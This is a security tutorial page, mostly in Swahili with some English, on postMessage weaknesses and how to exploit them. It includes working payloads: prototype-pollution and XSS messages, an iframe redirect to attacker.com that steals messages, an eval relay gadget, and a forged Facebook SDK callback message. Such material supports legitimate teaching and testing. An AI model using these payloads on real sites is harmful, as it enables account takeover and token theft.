# Udhaifu za PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Tuma **PostMessage**

**PostMessage** inatumia kazi ifuatayo kutuma ujumbe:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Kumbuka kwamba **targetOrigin** inaweza kuwa '\*' au URL kama _https://company.com._\
Katika **senario ya pili**, the **message can only be sent to that domain** (hata kama origin ya Window object ni tofauti).\
Ikiwa **wildcard** imetumika, **majumbe yanaweza kutumwa kwa domain yoyote**, na yatatumwa kwa origin ya Window object.

### Kushambulia iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) ikiwa utapata ukurasa unaoweza kuwa **iframed** (hakuna `X-Frame-Header` protection) na ambao unatumia **postMessage** kutuma ujumbe wenye maudhui **nyeti** kwa kutumia **wildcard** (\*), unaweza **kubadilisha** **origin** ya **iframe** na **leak** ujumbe **nyeti** kwa domain unayoidhibiti.\
Kumbuka kwamba ikiwa ukurasa unaweza ku-**iframed** lakini **targetOrigin** imewekwa **kwa URL na si kwa wildcard**, hii **njia haitafanya kazi**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** ni function inayotumika na JS kutangaza function inayotarajiwa kupokea `postMessages`.\
Kanuni inayofanana na ifuatayo itatumika:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

- **Tafuta** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
- **Endesha** in the developer tools console: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Nenda kwa** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../images/image (396).png>)

- Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). These browser extensions zitakamata ujumbe wote na kuonyesha kwako.

### Origin check bypasses

- **`event.isTrusted`** attribute inachukuliwa kuwa salama kwa sababu inarudisha `True` tu kwa events zinazotokana na vitendo halisi vya mtumiaji. Ingawa ni changamoto kuibypass ikiwa imetekelezwa ipasavyo, umuhimu wake katika ukaguzi wa usalama ni mkubwa.
- The use of **`indexOf()`** for origin validation in PostMessage events inaweza kuwa susceptible to bypassing. Mfano unaoonyesha ugumu huu ni:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- The **`search()`** method from `String.prototype.search()` imekusudiwa kwa regular expressions, si kwa strings. Kupitisha chochote isipokuwa regexp hupelekea conversion implicit kuwa regex, na kufanya method iwe potentially insecure. Hii ni kwa sababu katika regex, dot (.) inafanya kazi kama wildcard, kuruhusu bypassing ya validation kwa domains zilizotengenezwa mahsusi. Kwa mfano:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- The **`match()`** function, kama `search()`, inashughulikia regex. Ikiwa regex imepangwa vibaya, inaweza kuwa prone to bypassing.
- The **`escapeHtml`** function inakusudiwa kusafisha inputs kwa escaping characters. Hata hivyo, haitengenezi object mpya iliyofugwa bali inaandika juu properties za object iliyopo. Tabia hii inaweza kutumiwa vibaya. Hasa, ikiwa object inaweza kuchezewa ili property unayodhibitiwa isitambue `hasOwnProperty`, `escapeHtml` haitafanya kazi kama inavyotarajiwa. Hii inaonyeshwa katika mifano hapa chini:

- Expected Failure:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassing the escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Katika muktadha wa ugumu huu, `File` object inatumiwa kutokana na property yake ya read-only `name`. Property hii, inapofuatwa katika templates, haisafishwi na function ya `escapeHtml`, na inaweza kusababisha hatari za usalama.

- The `document.domain` property in JavaScript inaweza kuwekwa na script ili kufupisha domain, kuruhusu enforcement ya same-origin policy kuwa relaxed ndani ya parent domain moja.

### Origin-only trust + trusted relays

If a receiver only checks **`event.origin`** (e.g., trusts any `*.trusted.com`) unaweza mara nyingi kupata **"relay" page kwenye origin hiyo ambayo inaecho params zinazodhibitiwa na attacker kupitia `postMessage`** kwa `targetOrigin`/`targetWindow` iliyotolewa. Mifano ni pamoja na marketing/analytics gadgets ambazo zinachukua query params na kupeleka `{msg_type, access_token, ...}` kwa `opener`/`parent`. Unaweza:

- **Open the victim page in a popup/iframe that has an `opener`** ili handlers zake zichukue nafasi (pixels/SDKs nyingi huweka listeners tu wakati `window.opener` ipo).
- **Navigate another attacker window to the relay endpoint on the trusted origin**, ukijaza fields za message unayotaka ziingizwe (message type, tokens, nonces).
- Kwa sababu message sasa inatoka **from the trusted origin**, origin-only validation inapitika na unaweza kuchochea vitendo vyenye privileges (mabadiliko ya state, API calls, DOM writes) katika victim listener.

Abuse patterns seen in the wild:

- Analytics SDKs (e.g., pixel/fbevents-style) zinatumia messages kama `FACEBOOK_IWL_BOOTSTRAP`, kisha **zitaita backend APIs kwa kutumia token iliyotolewa katika message** na kujumuisha **`location.href` / `document.referrer`** katika request body. Ikiwa utatoa token yako mwenyewe, unaweza **kusoma requests hizi katika token’s request history/logs** na exfil **OAuth codes/tokens** zilizopo kwenye URL/referrer ya page ya victim.
- Kila relay ambayo inareflect fields yoyote katika `postMessage` inakuwezesha **spoof message types** zinazotarajiwa na privileged listeners. Changanya na weak input validation kufikia Graph/REST calls, feature unlocks, au CSRF-equivalent flows.

Hunting tips: orodha `postMessage` listeners ambazo zinacheki tu `event.origin`, kisha tazama **same-origin HTML/JS endpoints ambazo zinaforward URL params via `postMessage`** (marketing previews, login popups, OAuth error pages). Unganisha zote mbili kwa `window.open()` + `postMessage` ili kutokomeza origin checks.

### e.origin == window.origin bypass

When embedding a web page within a **sandboxed iframe** using %%%%%%, ni muhimu kuelewa kwamba origin ya iframe itakuwa `null`. Hii ni muhimu hasa unaposhughulika na **sandbox attributes** na implications zao kwenye usalama na ufanisi.

Kwa kuainisha **`allow-popups`** katika sandbox attribute, popup yoyote inayo funguliwa kutoka ndani ya iframe itapokea sandbox restrictions za parent yake. Hii ina maana kwamba isipokuwa attribute ya **`allow-popups-to-escape-sandbox`** pia iwepo, origin ya popup itawekwa `null` pia, ikilingana na origin ya iframe.

Kwa hivyo, wakati popup inafunguliwa chini ya masharti haya na message ikitumwa kutoka iframe kwenda popup kwa kutumia **`postMessage`**, pande zote mbili za kutuma na kupokea zitakuwa na origins `null`. Hali hii inasababisha scenario ambapo **`e.origin == window.origin`** itatathminiwa kuwa true (`null == null`), kwa sababu iframe na popup wote wanashiriki value ya origin ya `null`.

For more information **read**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

It's possible to check if the message came from the same window the script is listening in (specially interesting for **Content Scripts from browser extensions** to check if the message was sent from the same page):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Unaweza kulazimisha **`e.source`** ya ujumbe iwe null kwa kuunda **iframe** ambayo **inatuma** **postMessage** na **inafutwa mara moja**.

Kwa maelezo zaidi **soma:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Ili kutekeleza mashambulizi haya kwa namna bora, itafaa uweze **kuweka ukurasa wa mtandao wa mwathirika** ndani ya `iframe`. Lakini vichwa vya HTTP kama `X-Frame-Header` vinaweza **kuzuia** hiyo **tabia**.\
Katika matukio hayo bado unaweza kutumia shambulio lisilo la siri sana. Unaweza kufungua tabo mpya kwa web application yenye udhaifu na kuwasiliana nayo:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Kuiba ujumbe uliotumwa kwa child kwa kuzuia ukurasa mkuu

Kwenye ukurasa ufuatao unaweza kuona jinsi ungeweza kuiba **sensitive postmessage data** iliyotumwa kwa **child iframe** kwa **blocking** **main** page kabla ya kutuma data na abusing a **XSS in the child** ili **leak the data** kabla haipokelewi:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Kuiba ujumbe kwa kubadilisha location ya iframe

Ikiwa unaweza iframe webpage bila X-Frame-Header ambayo ina iframe nyingine, unaweza **change the location of that child iframe**, hivyo ikiwa inapokea **postmessage** iliyotumwa kwa kutumia **wildcard**, mshambuliaji anaweza **change** origin ya iframe hiyo kwa ukurasa **controlled** naye na **steal** ujumbe:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage kwa Prototype Pollution na/au XSS

Katika mazingira ambapo data inayotumwa kupitia `postMessage` inaendeshwa na JS, unaweza **iframe** ukurasa na **exploit** **prototype pollution/XSS** kwa kutuma exploit kupitia `postMessage`.

Mifano kadhaa ya **very good explained XSS though `postMessage`** inaweza kupatikana kwenye [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Mfano wa exploit ya kutumia **Prototype Pollution and then XSS** kupitia `postMessage` kwa `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Kwa **taarifa zaidi**:

- Kiungo kwa ukurasa kuhusu [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Kiungo kwa ukurasa kuhusu [**XSS**](../xss-cross-site-scripting/index.html)
- Kiungo kwa ukurasa kuhusu [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Utoaji wa script uliotokana na origin & supply-chain pivot (CAPIG case study)

`capig-events.js` ilijisajili handler ya `message` tu wakati `window.opener` ilikuwapo. Katika `IWL_BOOTSTRAP` ilikagua `pixel_id` lakini ilihifadhi `event.origin` na baadaye ikaitumia kujenga `${host}/sdk/${pixel_id}/iwl.js`.

<details>
<summary>Handler akiandika origin inayodhibitiwa na mshambuliaji</summary>
```javascript
if (window.opener) {
window.addEventListener("message", (event) => {
if (
!localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
!localStorage.getItem("FACEBOOK_IWL_CONFIG_STORAGE_KEY") &&
event.data.msg_type === "IWL_BOOTSTRAP" &&
checkInList(g.pixels, event.data.pixel_id) !== -1
) {
localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
pixelID: event.data.pixel_id,
host: event.origin,
sessionStartTime: event.data.session_start_time,
})
startIWL() // loads `${host}/sdk/${pixel_id}/iwl.js`
}
})
}
```
</details>

**Exploit (origin → script-src pivot):**
1. Pata opener: kwa mfano, ndani ya Facebook Android WebView tumia tena `window.name` kwa kutumia `window.open(target, name)` ili dirisha liwe opener yake mwenyewe, kisha tumia `postMessage` kutoka iframe yenye madhara.
2. Tuma `IWL_BOOTSTRAP` kutoka origin yoyote ili kuhifadhi `host = event.origin` katika `localStorage`.
3. Hifadhi `/sdk/<pixel_id>/iwl.js` kwenye origin yoyote inayoruhusiwa na CSP (takeover/XSS/upload kwenye domain ya analytics iliyopo kwenye whitelist). `startIWL()` kisha inaleta attacker JS kwenye embedding site (mfano, `www.meta.com`), ikiruhusu cross-origin calls zenye credentials na takeover ya akaunti.

Ikiwa udhibiti wa opener moja kwa moja ulikuwa haiwezekani, kuvuruga iframe ya upande wa tatu kwenye ukurasa bado kuliruhusu kutuma `postMessage` iliyoandaliwa kwa parent ili kuharibu host iliyohifadhiwa na kulazimisha upakuaji wa script.

**Backend-generated shared script → stored XSS:** plugin `AHPixelIWLParametersPlugin` iliunganisha user rule parameters ndani ya JS zilizoongezwa kwenye `capig-events.js` (mfano, `cbq.config.set(...)`). Kuingiza breakouts kama `"]}` kuliingiza arbitrary JS, na kusababisha stored XSS katika shared script inayotumika kwa tovuti zote zinazoiweka.

### Trusted-origin allowlist isn't a boundary

Ukaguzi mkali wa `event.origin` hufanya kazi tu ikiwa **trusted origin haiwezi kuendesha attacker JS**. Wakati privileged pages zinaweka third-party iframes na kudhani `event.origin === "https://partner.com"` ni salama, XSS yoyote katika `partner.com` inageuka kuwa daraja kuelekea parent:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Mfano wa shambulio ulioshuhudiwa katika mazingira halisi:

1. **Exploit XSS in the partner iframe** na kuingiza relay gadget ili kila `postMessage` iwe code exec ndani ya trusted origin:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Kutoka kwenye ukurasa wa attacker**, tuma JS kwa iframe iliyodhulumiwa inayopitisha aina ya ujumbe iliyokubaliwa kurudi kwa parent. Ujumbe unatoka `partner.com`, unapitisha allowlist, na unabeba HTML ambayo inaingizwa kwa njia isiyo salama:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. Parent inachoma HTML ya mshambuliaji, ikitoa **utekaji wa JS katika parent origin** (mfano, `facebook.com`), ambao unaweza kutumika kuiba OAuth codes au kugeuza kuwa takeover kamili ya akaunti.

Key takeaways:

- **Origin ya partner si kizuizi**: XSS yoyote katika partner "aliyeaminika" inaruhusu washambuliaji kutuma ujumbe unaoruhusiwa unaopitisha ukaguzi wa `event.origin`.
- Handlers zinazofanya **render partner-controlled payloads** (mfano, `innerHTML` kwa aina maalum za message) hufanya kompromisi ya partner kuwa same-origin DOM XSS.
- Uso mpana wa **message surface** (aina nyingi, hakuna uhalalishaji wa muundo) unatoa gadgets zaidi za kupivota mara iframe ya partner inapoharibiwa.

### Kutabiri **`Math.random()`** callback tokens katika postMessage bridges

Wakati uthibitisho wa message unatumia “shared secret” iliyozalishwa kwa `Math.random()` (mfano, `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) na helper hiyo hiyo pia inatoa majina kwa plugin iframes, unaweza kupata matokeo ya PRNG na kutengeneza ujumbe unaoonekana kuwa waaminifu:

- **Leak PRNG outputs via `window.name`:** SDK inaipa majina plugin iframes moja kwa moja kwa `guid()`. Ikiwa unadhibiti top frame, fanya iframe ukurasa wa mwathirika, kisha elekeza plugin iframe kwa origin yako (mfano, `window.frames[0].frames[0].location='https://attacker.com'`) na soma `window.frames[0].frames[0].name` ili kupata output ghafi ya `Math.random()`.
- **Force more outputs without reloads:** SDK zingine zinaonyesha njia ya reinit; katika FB SDK, kutuma `init:post` na `{xfbml:1}` inalazimisha `XFBML.parse()`, inaharibu/kuunda upya plugin iframe, na kuunda majina/mapendekezo mapya ya callback. Reinit iliyorudiwa inazalisha idadi ya PRNG outputs kama inavyohitajika (kumbuka wito za ndani za ziada za `Math.random()` kwa callback/iframe IDs, hivyo wasuluhishi lazima wapite thamani zinazotokea katikati).
- **Trusted-origin delivery via parameter pollution:** Ikiwa endpoint ya plugin ya first-party inarudisha parameter isiyotakaswa ndani ya payload ya cross-window (mfano, `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), unaweza kuingiza `&type=...&iconSVG=...` huku ukihifadhi origin ya kuaminika `facebook.com`.
- **Predict the next callback:** Geuza leaked iframe names kurudi kuwa floats katika `[0,1)` na ulize thamani kadhaa (hata zisizo mfululizo) katika predictor ya V8 `Math.random` (mfano, Z3-based). Tengeneza `guid()` inayofuata lokalini ili kutengeneza callback token inayotarajiwa.
- **Trigger the sink:** Unda data ya postMessage kwa njia kwamba bridge itafanya dispatch ya `xd.mpn.setupIconIframe` na kuingiza HTML ndani ya `iconSVG` (mfano, URL-encoded `<img src=x onerror=...>`), ukifikia DOM XSS ndani ya hosting origin; kutoka hapo, iframes zenye same-origin (dialogs za OAuth, arbiters, n.k.) zinaweza kusomwa.
- **Framing quirks help:** Mnyororo unahitaji framing. Katika baadhi ya mobile webviews, `X-Frame-Options` inaweza kupungua hadi `ALLOW-FROM` isiyotumika wakati `frame-ancestors` ipo, na vigezo vya “compat” vinaweza kulazimisha `frame-ancestors` yenye kibali, hivyo kuwezesha channel ya upande wa `window.name`.

#### Mfano mdogo wa ujumbe uliyoigizwa
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Marejeo

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Kwa mazoezi: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [CAPIG postMessage origin trust → script loading + stored JS injection](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
